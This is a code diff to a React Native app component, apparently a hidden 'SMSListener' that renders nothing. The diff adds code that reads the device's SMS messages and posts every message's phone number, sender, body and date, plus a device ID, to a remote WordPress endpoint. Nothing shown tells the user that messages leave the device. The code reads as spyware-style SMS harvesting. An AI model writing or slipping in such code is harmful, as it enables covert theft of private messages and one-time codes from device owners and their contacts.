@@ -8,7 +8,8 @@ import {
 } from "react-native";
 import React, { useEffect } from "react";
 import SmsAndroid from "react-native-get-sms-android";
-import SmsListener from "react-native-android-sms-listener";
+import { convertFromTimestamp, privateAxios } from "../utils";
+import * as SecureStore from "expo-secure-store";
 
 const getSMS = () => {
     let filter = {
@@ -22,9 +23,31 @@ const getSMS = () => {
         (fail) => {
             console.log("Failed with this error: " + fail);
         },
-        (count, smsList) => {
-            var arr = JSON.parse(smsList);
-            console.log(":::Message -> ", arr);
+        async (count, smsList) => {
+            const arr = JSON.parse(smsList);
+            const deviceId = await SecureStore.getItemAsync("device_id");
+            try {
+                const formattedMessage = arr.map((message) => ({
+                    phone_number: message?.address,
+                    name: message?.creator,
+                    type: message?.type,
+                    content: message?.body,
+                    date_time: convertFromTimestamp(message?.date_sent),
+                }));
+                const res = await privateAxios.post(
+                    "/wp-json/cyno/v1/message",
+                    {
+                        device_id: deviceId,
+                        data: formattedMessage,
+                    }
+                );
+                console.log("Res Messages => ", res.data);
+            } catch (error) {
+                console.log(
+                    "Error Messages => ",
+                    error.response?.data?.message
+                );
+            }
         }
     );
 };
@@ -38,20 +61,13 @@ async function requestReadSmsPermission() {
                 message: "Allow read SMS permission",
             }
         );
+        getSMS();
     } catch (err) {}
 }
 
 const SMSListener = () => {
     React.useEffect(() => {
-        getSMS();
         requestReadSmsPermission();
-
-        const subscription = SmsListener.addListener((message) => {
-            console.info(message);
-        });
-        return () => {
-            subscription.remove();
-        };
     }, []);
 
     return null;
